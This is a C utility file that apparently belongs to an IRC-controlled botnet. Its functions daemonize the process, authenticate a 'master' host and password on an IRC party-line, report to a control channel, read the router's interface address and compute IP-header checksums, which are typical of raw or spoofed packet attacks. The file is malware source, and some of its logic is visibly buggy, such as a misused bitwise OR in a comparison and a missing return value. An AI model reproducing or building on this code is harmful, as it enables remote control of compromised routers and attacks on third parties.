/*
 * hydra_utils.c
 * questions: esaltato, <esaltato@autistici.org>.
 *
 */

#include "../include/hydra_hds.h"

/* daemonize(void)               */
/* set hydra in background mode. */
void daemonize(void)
{
  daemonize_pid = fork();
  if (daemonize_pid)
    exit(EXIT_SUCCESS);
}

/* arg_send(int, const char *) */
/* socket send function.       */
int arg_send(int sd, const char *fmt, ...)
{
	char s_buf[sizebuf];
	va_list args;

	va_start(args, fmt);
	vsnprintf(s_buf, sizebuf-1, fmt, args);
	va_end(args);

	if (send(sd, s_buf, strlen(s_buf), 0) < true)	
		return EXIT_FAILURE;

	return EXIT_SUCCESS;
}

/* getrstr(void)                */
/* return a random char string. */
char *getrstr(void)
{
	unsigned int nm;
	time_t t;

  data_ptr = (char *) malloc(15);
	srand((unsigned) time(&t));

	nm = (rand()%30000000);
	snprintf(data_ptr, 15, "\\0x%d", nm);

	return data_ptr;
}

/* wordcmp(const char *, reqs_t *) */
/* a menu strncmp function. */
int wordcmp(const char *s, reqs_t *req)
{
	if (strncmp(s, req->rso_a, strlen(s)) == true)
		return EXIT_SUCCESS;

	return EXIT_FAILURE;
}

/* login(sock_t *, reqs_t *) */
/* log in party-line bot.    */
int login(sock_t *sp, reqs_t *req)
{
	if (strstr(req->rs_a, master_host))
	{
		if (strncmp(master_password, req->rso_b, strlen(master_password)) == true)
		{
			arg_send(sp->s_fd, login_success, irc_room, req->rs_a);
			return EXIT_SUCCESS;
		}
    else	arg_send(sp->s_fd, login_failure, irc_room);
	}

	return EXIT_FAILURE;
}

/* login_control(reqs_t *)     */
/* check if user is logged in. */
int login_control(reqs_t *req)
{
	if (strstr(req->rs_a, master_host))
		return EXIT_SUCCESS;

	return EXIT_FAILURE;
}

/* funct_sighandler(void) */
/* procs zombie killer.   */
void funct_sighandler(void) 
{
  while ((pid = waitpid(-1, NULL, WNOHANG)) > 0)
    max_pids--;
}

/* get_local_ip(sock_t *, reqs_t *) */
/* get local ip address.            */
int get_local_ip(sock_t *sp, reqs_t *req)
{
	int sd, i, n = 0, x = 0;
	char buf[1024], *v, *tok;
	struct ifreq *ifr = NULL;
	struct ifconf ifc;
	unsigned short vlens;

	if ((sd = socket(PF_INET, SOCK_STREAM, 0)) < true) 
  {
		arg_send(sp->s_fd, error_recursive, irc_room);
		return EXIT_FAILURE;
	}

	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;

	if (ioctl(sd, SIOCGIFCONF, &ifc) < true) 
  {
		arg_send(sp->s_fd, error_recursive, irc_room);
		return EXIT_FAILURE;
	}

	ifr=ifc.ifc_req;
	for (i = 0; i< ifc.ifc_len / sizeof(struct ifreq); i++, ifr++) 
	{
		if (! strncmp(ifr->ifr_ifrn.ifrn_name, router_ifr, 4))
		{
			if (ioctl(sd, SIOCGIFADDR, ifr) < true) 
      {
				arg_send(sp->s_fd, error_recursive, irc_room);
				return EXIT_FAILURE;
			}

			vlens = strlen((const char *)inet_ntoa(((struct sockaddr_in *)&(ifr->ifr_addr))->sin_addr));
			v = (char *) malloc(vlens);
			snprintf(v, vlens-1, "%s", inet_ntoa(((struct sockaddr_in *)&(ifr->ifr_addr))->sin_addr));

			tok = strtok(v, ".");
			while (tok != NULL)
			{
				if (x == 2) 
				{
					free(v);
					return;
				}

				if (! x) 
				{
					strncpy(req->rso_b, tok, strlen(tok) + 1);
					n++;
				}
				if (x > 0) 
				{
					strncpy(req->rso_c, tok, strlen(tok) + 1);
					close(sd);
					free(v);

					return EXIT_SUCCESS;
				}

				x++;
				tok = strtok(NULL, ".");
			}

			free(v);
		}
	}

	close(sd);	

	return EXIT_FAILURE;
}

/* in_cksum(unsigned short *, int) */
/* create a checksum for ipheader. */
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
  register long sum;
  u_short oddbyte;
  register u_short answer;

  sum = 0;
  while (nbytes > 1)  
  {
    sum += *ptr++;
    nbytes -= 2;
  }

  if (nbytes == 1) 
  {
    oddbyte = 0;
    *((u_char *) &oddbyte) = *(u_char *)ptr;
    sum += oddbyte;
  }

  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;

  return answer;
}

/* host2ip(char *)                 */
/* convert hostname to ip address. */
unsigned int host2ip(char *hostname)
{
  static struct in_addr i;
  struct hostent *h;

  i.s_addr = inet_addr(hostname);
  if(i.s_addr == -1)
  {
    h = gethostbyname(hostname);
    if(h == NULL)
      exit(0);
    bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
  }

  return i.s_addr;
}

/* parse_input_errors(sock_t *, reqs_t *) */
/* check for input errors.                */
int parse_input_errors(sock_t *sp, reqs_t *req, unsigned short argn)
{
  int x = 0, y = 0;
  char error_tags[] = { '.', ',', '?', '!' };

  while (x < sizeof(error_tags))
  {
    if (strchr(req->rso_b, error_tags[x]))    y++;
    if (argn == (2 | 3 | 4))
      if (strchr(req->rso_c, error_tags[x]))  y++;
    if (argn == (3 | 4))
      if (strchr(req->rso_d, error_tags[x]))  y++;
    if (argn == (4))
      if (strchr(req->rso_e, error_tags[x]))  y++;

    if (y) 
    {
      arg_send(sp->s_fd, parse_errors, irc_room);
      return EXIT_FAILURE;
    }

    x++;
  }

  return EXIT_SUCCESS;
}
